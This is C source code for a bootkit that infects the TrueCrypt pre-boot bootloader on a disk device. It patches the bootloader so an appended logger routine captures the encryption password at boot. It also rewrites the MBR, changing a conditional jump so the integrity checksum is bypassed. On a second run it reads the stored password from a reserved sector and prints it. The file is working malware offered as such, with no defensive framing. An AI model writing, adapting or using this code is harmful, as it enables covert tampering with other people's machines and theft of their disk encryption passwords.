#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define SECTOR_SIZE 512
#define TC_SECT_OFFSET_IN_MBR 0x80
#define TC_SECT_COUNT_OFFSET_IN_MBR 0x82
#define TC_MBR_JZ_CHKSUM_OFFSET 162
#define TC_BOOT_SECTOR_LOADER_LENGTH_OFFSET 432
#define TC_COM_EXECUTABLE_OFFSET 0x100
#define TC_MEM_REQUIRED_OFFSET 0x58
#define INFECTION_OVERHEAD g_ulogger_code_size
#define MIN_PASSWORD_SIZE 1
#define MAX_PASSWORD_SIZE 64
#define PASSWORD_OFFSET 0x7a00 // Last sector reserved to TrueCrypt Bootloader
                               // Most likely unused
#define JZ_INSTR 0x74
#define JMP_INSTR 0xEB

#define COMPRESSED_BOOTLOADER_FILE "tc_bootloader.gz"
#define DECOMPRESSED_BOOTLOADER_FILE "tc_bootloader"
#define PATCHED_BOOTLOADER_FILE "tc_bl_patched"
#define COMPRESSED_PATCHED_BOOTLOADER_FILE "tc_bl_patched.gz"

#define TC_COM_EXECUTABLE_OFFSET 0x100

#define CHK(x) {if((x) < 0) { perror(#x); exit(-1); }}
#define WEAK_CHK(x) {if((x) < 0) { perror(#x);}}
#define CHK_NOT0(x) {if((x) != 0) { perror(#x); exit(-1); }}
#define CHK_NULL(x) {if((x) == NULL) { perror(#x); exit(-1); }}
#define ADJUST(x) (x+2*512)//(((x)/512)*512+2*512)

// From TrueCrypt headers
typedef struct
{
	unsigned int Length;
	unsigned char Text[MAX_PASSWORD_SIZE + 1];
	char Pad[3];			  // keep 64-bit alignment
} Password;

extern void logger();
extern unsigned short g_ulogger_code_size;
extern unsigned short g_ucall_ask_password_delta_offset;

int infect_bootloader(char* bootloader, size_t bootloader_sz, size_t max_size);
off_t get_ask_password_call_off(char* bootloader, size_t size);
int already_infected(char * mbr/*, char * bootloader, size_t offset*/);
int patch_chksum(char * mbr);
int dump_password(int dev_fd);
unsigned short get_tc_mem_required(char* mbr, size_t size);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <device_to_infect>\n", argv[0]);
        exit(-1);
    }

    /* Opening Device */
    char * dev_name = argv[1];
    int dev_fd = open(dev_name, O_RDWR);
    CHK(dev_fd);

    /* Retrieve MBR */
    char mbr[SECTOR_SIZE];
    CHK(read(dev_fd, mbr, SECTOR_SIZE));
    //write(1, mbr, SECTOR_SIZE);

    /* Retrieve TrueCrypt BootLoader position using MBR */
    char tc_bl_sect = mbr[TC_SECT_OFFSET_IN_MBR] - 1;
    char tc_bl_sect_count = mbr[TC_SECT_COUNT_OFFSET_IN_MBR];
    size_t comp_bl_sz = /* *(unsigned short*)
        (mbr + TC_BOOT_SECTOR_LOADER_LENGTH_OFFSET); */
                                tc_bl_sect_count * SECTOR_SIZE;
    printf("TrueCrypt BootLoader sector num   = %d\n"
           "TrueCrypt BootLoader sector count = %d\n"
           "TrueCrypt BootLoader size = %d\n",
           tc_bl_sect, tc_bl_sect_count, comp_bl_sz);

    /* Retrieve the compressed bootloader content */
    char * comp_bootloader = malloc(comp_bl_sz * sizeof(char));
    CHK_NULL(comp_bootloader);
    CHK(lseek(dev_fd, tc_bl_sect * SECTOR_SIZE, SEEK_SET));
    CHK(read(dev_fd, comp_bootloader, comp_bl_sz));
    
    /* Dump it to a file to unzip it */
    int comp_bl_fd = open(COMPRESSED_BOOTLOADER_FILE,
                          O_WRONLY | O_CREAT | O_TRUNC, 0600);
    CHK(comp_bl_fd);
    write(comp_bl_fd, comp_bootloader, comp_bl_sz);
    free(comp_bootloader);

    /* Unzip using gzip */
    CHK(system("gzip -d -f "COMPRESSED_BOOTLOADER_FILE));

    /* Read the unzipped bootloader */
    int bootloader_fd = open(DECOMPRESSED_BOOTLOADER_FILE, O_RDWR);
    CHK(bootloader_fd);
    struct stat bl_st;
    CHK(fstat(bootloader_fd, &bl_st));
    printf("uncompressed bootloader size = 0x%x\n",
            (unsigned int)bl_st.st_size);
    printf("infection overhead = 0x%x\n", INFECTION_OVERHEAD);
    size_t uncompressed_bl_sz = get_tc_mem_required(mbr, SECTOR_SIZE);
    size_t infected_bl_sz = uncompressed_bl_sz + INFECTION_OVERHEAD;
    char * bootloader = malloc(infected_bl_sz * sizeof(char));
    CHK_NULL(bootloader);
    memset(bootloader, 0, infected_bl_sz);
    CHK(read(bootloader_fd, bootloader, uncompressed_bl_sz));
    //write(1, bootloader, uncompressed_bl_sz);
    
    WEAK_CHK(unlink(DECOMPRESSED_BOOTLOADER_FILE));
    
    /* Checking if the bootloader is already infected */
    puts("Checking for prior infection...");
    if(already_infected(mbr)) {
        puts("TrueCrypt is already infected, dumping password");
        return dump_password(dev_fd);
    }
   
    /* Infect BootLoader */
    infect_bootloader(bootloader, uncompressed_bl_sz, infected_bl_sz);

    /* Rezip the bootlader */
    int patched_bl_fd = open(PATCHED_BOOTLOADER_FILE,
                      O_CREAT | O_TRUNC | O_RDWR, 0700);
    CHK(patched_bl_fd);
    CHK(write(patched_bl_fd, bootloader, infected_bl_sz));
    CHK(close(patched_bl_fd));
    CHK(system("gzip -n --best -f "PATCHED_BOOTLOADER_FILE));

    /* Rewrite it */
    int comp_patched_bl_fd = open(COMPRESSED_PATCHED_BOOTLOADER_FILE, O_RDONLY);
    CHK(comp_patched_bl_fd);
    struct stat pbl_st;
    CHK(fstat(comp_patched_bl_fd, &pbl_st));
    size_t cpbl_sz = pbl_st.st_size;
    char * recomp_bootloader = malloc(cpbl_sz * sizeof(char));
    CHK(read(comp_patched_bl_fd, recomp_bootloader, cpbl_sz));
    CHK(lseek(dev_fd, tc_bl_sect * SECTOR_SIZE, SEEK_SET));
    CHK(write(dev_fd, recomp_bootloader, cpbl_sz));

    /* Patch the checksums in MBR (bypass the compressed bootloader one) */
    CHK(patch_chksum(mbr));

    /* Update compressed size in MBR */
    /* Actually unnecessary, this is just used for checksum */
    /* (Works with this line commented out) */
    *(unsigned short *)&mbr[TC_BOOT_SECTOR_LOADER_LENGTH_OFFSET] = cpbl_sz;
    printf("New compressed bootloader size = %d\n", cpbl_sz);

    /* Update the required mem in MBR */
    *(unsigned short *)&mbr[TC_MEM_REQUIRED_OFFSET] = infected_bl_sz;
    

    /* Rewrite MBR */
    CHK(lseek(dev_fd, 0, SEEK_SET));
    CHK(write(dev_fd, mbr, SECTOR_SIZE));


    CHK(close(dev_fd));
    CHK(close(comp_patched_bl_fd));
    free(bootloader);
    free(recomp_bootloader);
    WEAK_CHK(unlink(COMPRESSED_PATCHED_BOOTLOADER_FILE));
    return 0;
}

int infect_bootloader(char* bootloader, size_t bootloader_sz, size_t max_size) {

    if(bootloader == NULL || max_size-bootloader_sz < g_ulogger_code_size) {
        fprintf(stderr, "Invalid arguments in infect_bootloader, bootloader is"
                        "NULL or not big enough\n");
        exit(-1);
    }

    /* Append logger.asm */
    memcpy(bootloader + bootloader_sz, logger, g_ulogger_code_size);

    /* Change AskPassword call to logger call */
    off_t ask_password_call_off = get_ask_password_call_off(bootloader,
                                                            bootloader_sz);
    signed short ask_password_off = ask_password_call_off + 3 + *(signed short*)
                            (bootloader + ask_password_call_off + 1);
    signed short logger_offset = (signed short) bootloader_sz;
    signed short relative_logger_offset = logger_offset 
                - (ask_password_call_off + 3);

    printf("AskPassword() offset = 0x%x\n", (unsigned int) ask_password_off);
    printf("logger() offset = 0x%x\n", logger_offset);

    memcpy(bootloader + ask_password_call_off + 1,
            (char*)&relative_logger_offset,
            sizeof(signed short));

    printf("Patching logger at offset %x\n", 
            bootloader_sz + g_ucall_ask_password_delta_offset);

    /* Patch logger internal call to AskPassword */
    signed short rel_ask_pass_off = 
            ask_password_off -                      // Code to call
            (bootloader_sz +                        // Beginning of logger
            g_ucall_ask_password_delta_offset + 2); // End of call instr
    memcpy(bootloader + bootloader_sz + g_ucall_ask_password_delta_offset,
           (char*)&rel_ask_pass_off, sizeof(signed short));

    return 0;
}

off_t bufbuf(const char* needle, size_t needle_sz,
             const char* haystack, size_t haystack_sz) {
    off_t i;
    for(i = 0; (size_t) i < haystack_sz-needle_sz; i++) {
        if(memcmp(needle, haystack+i, needle_sz)==0) {
            return i;
        }
    }
    return -1;
}

off_t get_ask_password_call_off(char* bootloader, size_t size) {
    // in boot loader:
    // 6A 22      push 22h             ; bootArguments->BootPassword
    // E8 XX XX   call AskPassword

    static const char ask_pass_call_pref[3] = {0x6a,0x22,0xe8};
    static const size_t ask_pass_call_pref_sz = 3;
    off_t push_off = bufbuf(ask_pass_call_pref, ask_pass_call_pref_sz,
                            bootloader, size);
    if(push_off < 0)
        return -1;
    else
        return push_off + 2; // Call offset
}

unsigned short get_tc_mem_required(char* mbr, size_t size) {
    // in MBR:
    // B9 FF XX   mov cx, 0xXXff  ; TC_BOOT_MEMORY_REQUIRED * 1024
    //                              - TC_COM_EXECUTABLE_OFFSET - 1
    // FC         cld
    // F3 AA      rep stosb
    if (size < TC_MEM_REQUIRED_OFFSET) {
        perror("Unable to retrieve mem required by TC, exiting");
        exit(-1);
    }
    
    unsigned short value =  *(unsigned short*) (mbr + TC_MEM_REQUIRED_OFFSET);
    return value + TC_COM_EXECUTABLE_OFFSET + 1;
}

int already_infected(char * mbr/*, char * bootloader, size_t size*/) {
    return (unsigned char)mbr[TC_MBR_JZ_CHKSUM_OFFSET] == JMP_INSTR;
    /*
    return memcmp(bootloader+size-g_ulogger_code_size, logger,
                  g_ucall_ask_password_delta_offset-1) == 0;
    */
}

int patch_chksum(char * mbr) {
    // TODO Look for the right offset
    if(mbr == NULL) {
        fprintf(stderr, "patch_checksum(): null mbr");
        return -1;
    }
    if(mbr[TC_MBR_JZ_CHKSUM_OFFSET] != JZ_INSTR) {
        fprintf(stderr, "Unexpected byte in MBR, aborting patch_checksum()\n");
        return -1;
    }
 
    mbr[TC_MBR_JZ_CHKSUM_OFFSET] = JMP_INSTR;

    puts("Bypassed checksum");

    return 0;
}

int dump_password(int dev_fd) {
    if (dev_fd < 0) {
        fputs("Device file descriptor is invalid, exiting\n",stderr);
        exit(-1);
    }

    Password pass;

    CHK(lseek(dev_fd, PASSWORD_OFFSET, SEEK_SET));
    CHK(read(dev_fd, &pass, sizeof(Password)));

    if(pass.Length < MIN_PASSWORD_SIZE || pass.Length > MAX_PASSWORD_SIZE) {
        fprintf(stderr, "Invalid password length (%d)\n", pass.Length);
        return -1;
    }

    pass.Text[pass.Length] = '\0';

    printf("*** The password is [%s] ***\n", pass.Text);

    return 0;
}
